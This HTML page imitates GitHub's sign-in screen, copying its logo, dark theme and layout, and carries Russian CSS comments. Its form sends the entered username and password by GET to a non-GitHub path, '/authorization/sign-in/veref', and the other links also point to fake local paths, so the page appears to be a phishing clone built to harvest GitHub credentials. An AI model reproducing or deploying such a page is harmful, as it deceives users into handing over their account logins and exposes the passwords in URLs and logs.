<!DOCTYPE html>
<html lang="en" data-color-mode="dark" data-dark-theme="dark_dimmed">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to GitHub</title>
  <style>
    :root {
      /* Светлая тема (fallback) */
      --bg-body: #f6f8fa;
      --card-bg: #ffffff;
      --text-primary: #24292e;
      --text-secondary: #586069;
      --border-color: #e1e4e8;
      --input-bg: #f6f8fa;
      --input-border: #e1e4e8;
      --input-focus-border: #0366d6;
      --btn-bg: #0366d6;
      --btn-hover: #035fc7;
      --link-color: #0366d6;
      --divider-color: #e1e4e8;
    }

    [data-dark-theme="dark_dimmed"] {
      /* GitHub Dark Dimmed — официальные значения */
      --bg-body: #010409;
      --card-bg: #0d1117;
      --text-primary: #c9d1d9;
      --text-secondary: #8b949e;
      --border-color: #30363d;
      --input-bg: #0d1117;
      --input-border: #30363d;
      --input-focus-border: #388bfd;
      --btn-bg: #0265d2;
      --btn-hover: #035bc7;
      --link-color: #58a6ff;
      --divider-color: #30363d;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: var(--bg-body);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
      color: var(--text-primary);
      transition: background-color 0.2s;
    }

    .card {
      background: var(--card-bg);
      border: 1px solid var(--border-color);
      border-radius: 6px;
      box-shadow: 0 1px 6px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 420px;
      padding: 32px;
    }

    .header {
      text-align: center;
      margin-bottom: 24px;
    }

    .logo {
      width: 40px;
      height: 40px;
      margin: 0 auto 16px;
      fill: var(--text-primary);
    }

    h1 {
      font-size: 20px;
      font-weight: 600;
      color: var(--text-primary);
      margin-bottom: 8px;
    }

    .subtitle {
      font-size: 14px;
      color: var(--text-secondary);
    }

    .label {
      display: block;
      font-size: 12px;
      font-weight: 600;
      margin: 20px 0 6px;
      color: var(--text-primary);
    }

    .input {
      width: 100%;
      padding: 8px 12px;
      font-size: 14px;
      border: 1px solid var(--input-border);
      border-radius: 6px;
      background-color: var(--input-bg);
      color: var(--text-primary);
      transition: border-color 0.2s, background-color 0.2s;
    }

    .input:focus {
      outline: none;
      border-color: var(--input-focus-border);
      box-shadow: inset 0 0 0 1px var(--input-focus-border);
    }

    .btn {
      display: block;
      width: 100%;
      padding: 10px 16px;
      font-size: 14px;
      font-weight: 600;
      color: white;
      background-color: var(--btn-bg);
      border: 1px solid rgba(240,246,252,0.1);
      border-radius: 6px;
      cursor: pointer;
      margin-top: 24px;
      transition: background-color 0.2s;
    }

    .btn:hover {
      background-color: var(--btn-hover);
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: var(--text-secondary);
      margin-top: 24px;
    }

    .footer a {
      color: var(--link-color);
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 24px 0;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid var(--divider-color);
    }

    .divider span {
      padding: 0 8px;
      color: var(--text-secondary);
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="header">
      <svg class="logo" viewBox="0 0 16 16" version="1.1" width="40" height="40">
        <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
      </svg>
      <h1>Sign in to GitHub</h1>
      <p class="subtitle">Enter your credentials</p>
    </div>

    <form action="/authorization/sign-in/veref" method="GET">
      <label class="label" for="login">Username or email address</label>
      <input class="input" id="login" name="username" type="text" required>

      <label class="label" for="password">Password</label>
      <input class="input" id="password" name="password" type="password" required>

      <button class="btn" type="submit">Sign in</button>
    </form>

    <div class="divider">
      <span>or</span>
    </div>

    <div class="footer">
      <p>New to GitHub? <a href="/authorization/reg-new-user">Create an account</a></p>
      <p><a href="#">Forgot password?</a></p>
    </div>
  </div>
</body>
</html>
